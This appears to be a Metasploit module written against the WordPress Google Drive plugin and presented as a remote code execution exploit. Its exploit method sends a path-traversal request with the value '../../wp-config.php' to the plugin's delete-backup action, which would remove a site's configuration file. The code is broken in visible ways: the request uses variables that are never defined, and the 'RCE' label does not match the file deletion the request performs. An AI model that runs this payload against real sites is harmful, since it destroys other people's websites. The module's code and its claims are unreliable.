##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Google Drive for WordPress',
      'Description'    => %q{
        This module exploits an arbitrary remote code execution (RCE) in the WordPress
        plugin Google Drive.
      },
      'Author'         =>
        [
          'Lenon Leite', # Vulnerability Discovery
          'Mateus Lino  <dctoralves[at]gmail.com>'  # Metasploit Module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://www.exploit-db.com/exploits/44435/']
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'May 08 2018')
    )
  end
def exploit
  send_request_cgi({
        'method'   => 'POST',
        'uri'      => "wp-content/plugins/wp-google-drive/gdrive-ajaxs.php",
        'data'     => post_data,
        'vars_get' => {
          'ajaxstype' => 'del_fl_bkp',
          'file_name'       => '../../wp-config.php',
          'is' => '1',
        }
      })
if res
      if res.code == 200
        print_status("Exploitable")
      else
        print_error("Module not found")
       end
else
  print_error("Error")
end

end
end

